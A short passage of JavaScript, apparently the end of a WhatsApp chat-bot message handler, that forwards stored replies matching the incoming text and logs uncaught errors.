let msgs = global.db.database
if (!(budy.toLowerCase() in msgs)) return
TradzSigma.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
}
}

} catch (err) {
console.log(util.format(err))
let e = String(err)
}
}

process.on('uncaughtException', function (err) {
console.log('Caught exception: ', err)
})
//=================================================//
